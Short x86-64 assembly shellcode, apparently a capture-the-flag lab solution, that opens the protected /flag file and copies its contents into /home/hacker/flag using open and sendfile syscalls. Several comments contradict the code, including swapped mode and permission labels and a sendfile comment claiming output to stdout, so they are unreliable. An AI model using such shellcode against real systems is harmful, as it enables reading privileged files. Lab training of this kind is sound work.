.globl _start
.intel_syntax noprefix

_start:
    mov rax, 2                  # syscall number of open
    lea edi, [rip+new_flag]     # Ptr to "/home/hacker/flag"
    mov rdx, 0x1ff              # Mode (O_RDWR | O_CREAT)
    mov rsi, 0x41               # Permissions (0755)
    syscall                     # trigger open("/home/hacker/flag", NULL)
    push rax

    mov rax, 2                  # syscall number of open
    lea edi, [rip+flag]         # Ptr to "/flag"
    mov rsi, 0                  # NULL out the second argument (meaning, O_RDONLY)
    syscall                     # trigger open("/flag", NULL)

    #mov rdi, 1                  # first argument to sendfile is the file descriptor to output to (stdout)
    pop rdi
    mov rsi, rax                # second argument is the file descriptor returned by open
    mov rdx, 0                  # third argument is the number of bytes to skip from the input file
    mov r10, 1000               # fourth argument is the number of bytes to transfer to the output file
    mov rax, 40                 # syscall number of sendfile
    syscall                     # trigger sendfile(1, fd, 0, 1000)

    mov rax, 60                 # syscall number of exit
    syscall                     # trigger exit()

flag:
    .string "/flag"

new_flag:
    .string "/home/hacker/flag"
